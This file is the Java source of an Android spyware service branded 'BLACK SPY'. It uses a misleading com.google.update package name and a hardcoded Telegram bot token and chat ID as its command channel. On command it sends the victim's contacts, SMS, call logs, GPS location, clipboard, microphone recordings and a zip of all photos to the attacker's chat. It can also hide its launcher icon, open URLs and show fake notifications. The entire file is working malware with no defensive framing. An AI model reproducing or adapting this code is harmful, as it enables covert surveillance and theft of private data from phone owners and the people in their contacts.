package com.google.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class TelegramBotService extends Service {
    private static final String BOT_TOKEN = "8652354299:AAEOH62d9BHbl064QYcFC2LgbiAH_doiwhU";
    private static final String CHAT_ID = "6793813126";
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    
    private int lastUpdateId = 0;
    private String targetDeviceId = null;
    private String targetDeviceName = null;
    
    private MediaRecorder mediaRecorder;
    private File currentAudioFile;
    private boolean isRecording = false;
    
    private ScheduledExecutorService scheduler;
    private ScheduledExecutorService registrationScheduler;
    
    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(1, createNotification());
        scheduler = Executors.newSingleThreadScheduledExecutor();
        startBot();
        startPeriodicRegistration();
    }
    
    private void startPeriodicRegistration() {
        registrationScheduler = Executors.newSingleThreadScheduledExecutor();
        registrationScheduler.scheduleWithFixedDelay(() -> {
            if (targetDeviceId == null) {
                sendRegistration();
            }
        }, 0, 10, TimeUnit.SECONDS);
    }
    
    private void sendRegistration() {
        new Thread(() -> {
            try {
                String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " Android " + Build.VERSION.RELEASE;
                JSONObject json = new JSONObject();
                json.put("device_id", deviceId);
                json.put("device_name", deviceName);
                String msg = "REGISTER:" + json.toString();
                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
    
    private void startBot() {
        scheduler.scheduleWithFixedDelay(() -> {
            try {
                String response = get(API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
                if (response != null && response.contains("\"ok\":true")) {
                    JSONObject json = new JSONObject(response);
                    JSONArray results = json.getJSONArray("result");
                    for (int i = 0; i < results.length(); i++) {
                        JSONObject update = results.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id");
                        if (update.has("message") && update.getJSONObject("message").has("text")) {
                            JSONObject msg = update.getJSONObject("message");
                            String text = msg.getString("text").trim();
                            long chatId = msg.getJSONObject("chat").getLong("id");
                            if (String.valueOf(chatId).equals(CHAT_ID)) {
                                handleCommand(text);
                            } else if (text.startsWith("REGISTER:") && targetDeviceId == null) {
                                String data = text.replace("REGISTER:", "");
                                JSONObject info = new JSONObject(data);
                                targetDeviceId = info.getString("device_id");
                                targetDeviceName = info.getString("device_name");
                                sendMessage("✅ BLACK SPY ONLINE ✅\n📍 " + targetDeviceName);
                                if (registrationScheduler != null) {
                                    registrationScheduler.shutdown();
                                }
                                sendCommandMenu();
                            }
                        }
                    }
                }
            } catch (Exception e) {}
        }, 0, 2, TimeUnit.SECONDS);
    }
    
    private void handleCommand(String cmd) {
        String c = cmd.trim().toLowerCase();
        
        if (c.equals("/start")) {
            if (targetDeviceId == null) {
                sendMessage("🔥 BLACK SPY 🔥\n\n⏳ انتظر اتصال الجهاز...");
            } else {
                sendCommandMenu();
            }
            return;
        }
        
        if (targetDeviceId == null) {
            sendMessage("❌ لا يوجد جهاز مستهدف");
            return;
        }
        
        if (c.equals("/info")) sendDeviceInfo();
        else if (c.equals("/contacts")) sendContacts();
        else if (c.equals("/sms")) sendSMS();
        else if (c.equals("/calllogs")) sendCallLogs();
        else if (c.equals("/location")) getLocation();
        else if (c.equals("/record")) startRecording();
        else if (c.equals("/stoprec")) stopRecording();
        else if (c.equals("/steal_photos")) stealAllPhotos();
        else if (c.equals("/battery")) sendBatteryInfo();
        else if (c.equals("/network")) sendNetworkInfo();
        else if (c.equals("/sim")) sendSimInfo();
        else if (c.equals("/apps")) sendAppsList();
        else if (c.equals("/hide")) hideApp();
        else if (c.equals("/show")) showApp();
        else if (c.equals("/status")) sendStatus();
        else if (c.startsWith("/notify ")) sendFakeNotification(cmd.substring(8).trim());
        else if (c.startsWith("/vibrate ")) vibrateDevice(cmd.substring(9).trim());
        else if (c.startsWith("/openurl ")) openUrl(cmd.substring(9).trim());
        else if (c.equals("/clipboard")) getClipboard();
        else sendMessage("❌ أمر غير معروف");
    }
    
    private void sendDeviceInfo() {
        try {
            String info = "📱 <b>معلومات الجهاز</b>\n────────────────\n"
                    + "📌 الموديل: " + Build.MANUFACTURER + " " + Build.MODEL + "\n"
                    + "📌 Android: " + Build.VERSION.RELEASE + "\n"
                    + "📌 الجهاز: " + Build.DEVICE + "\n"
                    + "📌 المنتج: " + Build.PRODUCT + "\n"
                    + "📌 العلامة: " + Build.BRAND;
            sendMessage(info);
        } catch (Exception e) { sendMessage("❌ خطأ"); }
    }
    
    private void sendContacts() {
        new Thread(() -> {
            try {
                File f = new File(getCacheDir(), "contacts.csv");
                OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(f), "UTF-8");
                w.write('\ufeff');
                w.write("الاسم,رقم الهاتف\n");
                ContentResolver cr = getContentResolver();
                Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
                if (cur != null) {
                    while (cur.moveToNext()) {
                        String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                        String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                        if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                            Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                            if (pCur != null) {
                                while (pCur.moveToNext()) {
                                    String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    w.write("\"" + (name != null ? name : "") + "\",\"" + (phone != null ? phone : "") + "\"\n");
                                }
                                pCur.close();
                            }
                        }
                    }
                    cur.close();
                }
                w.close();
                sendFile(f, "📇 جهات الاتصال");
                f.delete();
            } catch (Exception e) {}
        }).start();
    }
    
    private void sendSMS() {
        new Thread(() -> {
            try {
                File f = new File(getCacheDir(), "sms.csv");
                OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(f), "UTF-8");
                w.write('\ufeff');
                w.write("النوع,الرقم,التاريخ,النص\n");
                if (Build.VERSION.SDK_INT >= 19) {
                    Cursor c = getContentResolver().query(android.provider.Telephony.Sms.CONTENT_URI, null, null, null, android.provider.Telephony.Sms.DEFAULT_SORT_ORDER);
                    if (c != null) {
                        while (c.moveToNext()) {
                            String addr = c.getString(c.getColumnIndex(android.provider.Telephony.Sms.ADDRESS));
                            String body = c.getString(c.getColumnIndex(android.provider.Telephony.Sms.BODY));
                            String date = c.getString(c.getColumnIndex(android.provider.Telephony.Sms.DATE));
                            String type = c.getString(c.getColumnIndex(android.provider.Telephony.Sms.TYPE));
                            String t = type.equals("1") ? "واردة" : (type.equals("2") ? "صادرة" : "مسودة");
                            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.US);
                            w.write("\"" + t + "\",\"" + (addr != null ? addr : "") + "\",\"" + sdf.format(new Date(Long.parseLong(date))) + "\",\"" + (body != null ? body.replace("\n", " ") : "") + "\"\n");
                        }
                        c.close();
                    }
                }
                w.close();
                sendFile(f, "💬 رسائل SMS");
                f.delete();
            } catch (Exception e) {}
        }).start();
    }
    
    private void sendCallLogs() {
        new Thread(() -> {
            try {
                File f = new File(getCacheDir(), "calls.csv");
                OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(f), "UTF-8");
                w.write('\ufeff');
                w.write("الرقم,النوع,التاريخ,المدة\n");
                Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                if (c != null) {
                    while (c.moveToNext()) {
                        String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                        String type = c.getString(c.getColumnIndex(CallLog.Calls.TYPE));
                        String date = c.getString(c.getColumnIndex(CallLog.Calls.DATE));
                        String dur = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
                        String t;
                        switch (Integer.parseInt(type)) {
                            case CallLog.Calls.INCOMING_TYPE: t = "وارد"; break;
                            case CallLog.Calls.OUTGOING_TYPE: t = "صادر"; break;
                            default: t = "فائت";
                        }
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.US);
                        w.write("\"" + (num != null ? num : "") + "\",\"" + t + "\",\"" + sdf.format(new Date(Long.parseLong(date))) + "\",\"" + dur + " ثانية\"\n");
                    }
                    c.close();
                }
                w.close();
                sendFile(f, "📞 سجلات المكالمات");
                f.delete();
            } catch (Exception e) {}
        }).start();
    }
    
    private void getLocation() {
        sendMessage("📍 جاري جلب الموقع...");
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) { sendMessage("❌ LocationManager غير متاح"); return; }
            if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER) && !lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                sendMessage("❌ الرجاء تفعيل GPS");
                return;
            }
            LocationListener listener = new LocationListener() {
                @Override public void onLocationChanged(Location loc) {
                    String url = "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                    sendMessage("📍 <b>الموقع الحالي</b>\n────────────────\n🌐 خط العرض: " + loc.getLatitude() + "\n🌐 خط الطول: " + loc.getLongitude() + "\n🎯 الدقة: " + loc.getAccuracy() + " متر\n🗺️ <a href='" + url + "'>اضغط للخريطة</a>");
                }
                @Override public void onProviderDisabled(String p) { sendMessage("❌ GPS معطل"); }
                @Override public void onStatusChanged(String p, int s, Bundle b) {}
                @Override public void onProviderEnabled(String p) {}
            };
            if (Build.VERSION.SDK_INT >= 23) {
                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    sendMessage("❌ لا توجد صلاحية الموقع");
                    return;
                }
            }
            lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
            new android.os.Handler().postDelayed(() -> sendMessage("❌ انتهى الوقت - لم يتم العثور على موقع"), 15000);
        } catch (SecurityException e) { sendMessage("❌ لا توجد صلاحية الموقع"); }
    }
    
    private void startRecording() {
        if (isRecording) { sendMessage("🎤 التسجيل قيد التشغيل بالفعل"); return; }
        try {
            if (Build.VERSION.SDK_INT >= 23) {
                if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    sendMessage("❌ لا توجد صلاحية التسجيل");
                    return;
                }
            }
            File dir = new File(getCacheDir(), "recordings");
            if (!dir.exists()) dir.mkdirs();
            currentAudioFile = new File(dir, "rec_" + System.currentTimeMillis() + ".3gp");
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentAudioFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            sendMessage("🎙️ <b>جاري التسجيل...</b>\nاستخدم /stoprec لإيقاف التسجيل وإرساله");
        } catch (Exception e) { sendMessage("❌ فشل بدء التسجيل: " + e.getMessage()); }
    }
    
    private void stopRecording() {
        if (!isRecording || mediaRecorder == null) { sendMessage("❌ لا يوجد تسجيل قيد التشغيل"); return; }
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
            if (currentAudioFile != null && currentAudioFile.exists() && currentAudioFile.length() > 0) {
                sendFile(currentAudioFile, "🎙️ تسجيل صوتي");
                currentAudioFile.delete();
            } else { sendMessage("❌ فشل حفظ التسجيل"); }
        } catch (Exception e) { sendMessage("❌ خطأ في إيقاف التسجيل"); }
    }
    
    private void stealAllPhotos() {
        new Thread(() -> {
            try {
                sendMessage("📸 جاري جمع الصور...");
                File zipFile = new File(getCacheDir(), "photos_" + System.currentTimeMillis() + ".zip");
                ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
                String[] projections = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME};
                Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projections, null, null, null);
                int count = 0;
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                        String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
                        if (path != null) {
                            File imgFile = new File(path);
                            if (imgFile.exists()) {
                                FileInputStream fis = new FileInputStream(imgFile);
                                zos.putNextEntry(new ZipEntry(name != null ? name : "image_" + count + ".jpg"));
                                byte[] buffer = new byte[8192];
                                int len;
                                while ((len = fis.read(buffer)) != -1) { zos.write(buffer, 0, len); }
                                zos.closeEntry();
                                fis.close();
                                count++;
                            }
                        }
                    }
                    cursor.close();
                }
                zos.close();
                if (count > 0) { sendFile(zipFile, "📸 " + count + " صورة تم جمعها"); }
                else { sendMessage("❌ لا توجد صور على الجهاز"); }
                zipFile.delete();
            } catch (Exception e) { sendMessage("❌ فشل جمع الصور: " + e.getMessage()); }
        }).start();
    }
    
    private void sendBatteryInfo() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(Context.BATTERY_SERVICE);
            int level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
            int status = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_STATUS);
            String statusText;
            switch (status) {
                case android.os.BatteryManager.BATTERY_STATUS_CHARGING: statusText = "🔋 يشحن"; break;
                case android.os.BatteryManager.BATTERY_STATUS_DISCHARGING: statusText = "⚡ يفرغ"; break;
                case android.os.BatteryManager.BATTERY_STATUS_FULL: statusText = "✅ ممتلئ"; break;
                default: statusText = "❓ غير معروف";
            }
            sendMessage("🔋 <b>حالة البطارية</b>\n────────────────\n📊 النسبة: " + level + "%\n" + statusText);
        } catch (Exception e) { sendMessage("❌ فشل جلب معلومات البطارية"); }
    }
    
    private void sendNetworkInfo() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wi = wm.getConnectionInfo();
            String ip = intToIp(wi.getIpAddress());
            String ssid = wi.getSSID();
            sendMessage("🌐 <b>معلومات الشبكة</b>\n────────────────\n📡 الواي فاي: " + (ssid != null ? ssid : "غير متصل") + "\n🌍 الـ IP: " + ip + "\n📶 القوة: " + wi.getRssi() + " dBm");
        } catch (Exception e) { sendMessage("❌ فشل جلب معلومات الشبكة"); }
    }
    
    private String intToIp(int i) {
        return (i & 0xFF) + "." + ((i >> 8) & 0xFF) + "." + ((i >> 16) & 0xFF) + "." + ((i >> 24) & 0xFF);
    }
    
    private void sendSimInfo() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= 23) {
                if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    sendMessage("❌ لا توجد صلاحية قراءة حالة الهاتف");
                    return;
                }
            }
            String operator = tm.getNetworkOperatorName();
            String country = tm.getNetworkCountryIso();
            String simOperator = tm.getSimOperatorName();
            sendMessage("📇 <b>معلومات SIM والشبكة</b>\n────────────────\n📡 المشغل: " + (operator != null ? operator : "غير معروف") + "\n🌍 الدولة: " + (country != null ? country : "غير معروف") + "\n📱 SIM: " + (simOperator != null ? simOperator : "غير معروف"));
        } catch (Exception e) { sendMessage("❌ فشل جلب معلومات SIM"); }
    }
    
    private void sendAppsList() {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("📱 <b>التطبيقات المثبتة</b>\n────────────────\n");
                PackageManager pm = getPackageManager();
                List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
                int count = 0;
                for (android.content.pm.ApplicationInfo app : apps) {
                    if ((app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                        String name = pm.getApplicationLabel(app).toString();
                        sb.append("• ").append(name).append("\n");
                        count++;
                        if (count > 50) { sb.append("... و" + (apps.size() - 50) + " تطبيق آخر"); break; }
                    }
                }
                sendMessage(sb.toString());
            } catch (Exception e) { sendMessage("❌ فشل جلب التطبيقات"); }
        }).start();
    }
    
    private void hideApp() {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            sendMessage("👻 <b>تم إخفاء التطبيق</b>\n✅ لن يظهر في درج التطبيقات");
        } catch (Exception e) { sendMessage("❌ فشل الإخفاء: " + e.getMessage()); }
    }
    
    private void showApp() {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            sendMessage("👁️ <b>تم إظهار التطبيق</b>\n✅ سيظهر في درج التطبيقات بعد إعادة التشغيل");
        } catch (Exception e) { sendMessage("❌ فشل الإظهار: " + e.getMessage()); }
    }
    
    private void sendStatus() {
        sendMessage("✅ <b>حالة التطبيق</b>\n────────────────\n📱 الجهاز: " + targetDeviceName + "\n🎤 التسجيل: " + (isRecording ? "قيد التشغيل 🟢" : "متوقف 🔴") + "\n🔗 البوت: متصل ✅\n📅 آخر تحديث: " + new SimpleDateFormat("HH:mm:ss").format(new Date()));
    }
    
    private void sendFakeNotification(String text) {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel("fake_ch", "إشعارات", NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }
            Notification notif = new Notification.Builder(this, "fake_ch")
                    .setContentTitle("🔔 إشعار جديد")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setAutoCancel(true)
                    .build();
            nm.notify((int) System.currentTimeMillis(), notif);
            sendMessage("🔔 تم إرسال الإشعار: " + text);
        } catch (Exception e) { sendMessage("❌ فشل إرسال الإشعار"); }
    }
    
    private void vibrateDevice(String durationStr) {
        try {
            int duration = Integer.parseInt(durationStr) * 1000;
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null && v.hasVibrator()) {
                v.vibrate(duration);
                sendMessage("📳 تم الاهتزاز لـ " + durationStr + " ثانية");
            } else { sendMessage("❌ الجهاز لا يدعم الاهتزاز"); }
        } catch (Exception e) { sendMessage("❌ فشل الاهتزاز"); }
    }
    
    private void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendMessage("🌐 تم فتح الرابط: " + url);
        } catch (Exception e) { sendMessage("❌ فشل فتح الرابط"); }
    }
    
    private void getClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm.hasPrimaryClip()) {
                String text = cm.getPrimaryClip().getItemAt(0).getText().toString();
                sendMessage("📋 <b>محتوى الحافظة</b>\n────────────────\n" + text);
            } else { sendMessage("📋 الحافظة فارغة"); }
        } catch (Exception e) { sendMessage("❌ فشل قراءة الحافظة"); }
    }
    
    private void sendCommandMenu() {
        String menu = "🔥 <b>BLACK SPY</b> 🔥\n"
                + "╔════════════════════════════╗\n"
                + "║   👹 Black Spy 👹          ║\n"
                + "║   🕷️ Hackers Walking Anous 🕷️\n"
                + "║   💀 Under World Spy 💀    ║\n"
                + "╚════════════════════════════╝\n\n"
                + "✅ <b>الجهاز المستهدف:</b> " + targetDeviceName + "\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n"
                + "🔰 <b>قائمة الأوامر (20 ميزة)</b> 🔰\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                + "<b>📇 معلومات</b>\n"
                + "/info ℹ️ معلومات الجهاز\n"
                + "/battery 🔋 حالة البطارية\n"
                + "/network 🌐 الشبكة والواي فاي\n"
                + "/sim 📇 معلومات SIM\n"
                + "/status ✅ حالة التطبيق\n\n"
                + "<b>📂 بيانات</b>\n"
                + "/contacts 📱 جهات الاتصال\n"
                + "/sms 💬 رسائل SMS\n"
                + "/calllogs 📞 سجلات المكالمات\n"
                + "/location 📍 الموقع الجغرافي\n"
                + "/clipboard 📋 الحافظة\n\n"
                + "<b>🎤 صوت</b>\n"
                + "/record 🎙️ بدء التسجيل\n"
                + "/stoprec ⏹️ إيقاف وإرسال\n\n"
                + "<b>📸 وسائط</b>\n"
                + "/steal_photos 📸 سرقة كل الصور\n\n"
                + "<b>📱 تطبيقات</b>\n"
                + "/apps 📱 قائمة التطبيقات\n"
                + "/openurl 🔗 فتح رابط\n\n"
                + "<b>👁 تحكم</b>\n"
                + "/hide 👻 إخفاء التطبيق\n"
                + "/show 👁️ إظهار التطبيق\n"
                + "/notify 🔔 إشعار وهمي\n"
                + "/vibrate 📳 اهتزاز\n\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n"
                + "⚠️ جميع الأوامر تنفذ فوراً على هذا الجهاز";
        sendMessage(menu);
    }
    
    private void sendFile(File file, String caption) {
        new Thread(() -> {
            try {
                String boundary = "*****" + System.currentTimeMillis();
                URL url = new URL(API_URL + "sendDocument");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                java.io.OutputStream os = conn.getOutputStream();
                java.io.PrintWriter w = new java.io.PrintWriter(new java.io.OutputStreamWriter(os), true);
                w.append("--" + boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
                w.append(CHAT_ID).append("\r\n");
                w.flush();
                if (caption != null) {
                    w.append("--" + boundary).append("\r\n");
                    w.append("Content-Disposition: form-data; name=\"caption\"").append("\r\n\r\n");
                    w.append(caption).append("\r\n");
                    w.flush();
                }
                w.append("--" + boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"").append("\r\n");
                w.append("Content-Type: application/octet-stream").append("\r\n\r\n");
                w.flush();
                FileInputStream fis = new FileInputStream(file);
                byte[] buf = new byte[8192];
                int read;
                while ((read = fis.read(buf)) != -1) os.write(buf, 0, read);
                os.flush();
                fis.close();
                w.append("\r\n").append("--" + boundary + "--").append("\r\n");
                w.close();
                os.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) { sendMessage("❌ فشل إرسال الملف: " + e.getMessage()); }
        }).start();
    }
    
    private void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=HTML&disable_web_page_preview=true";
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
    
    private String get(String urlStr) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }
    
    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("blackspy_ch", "Black Spy", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        return new NotificationCompat.Builder(this, "blackspy_ch")
                .setContentTitle("Black Spy")
                .setContentText("Online")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .build();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    
    @Override
    public void onDestroy() {
        if (scheduler != null) scheduler.shutdown();
        if (registrationScheduler != null) registrationScheduler.shutdown();
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
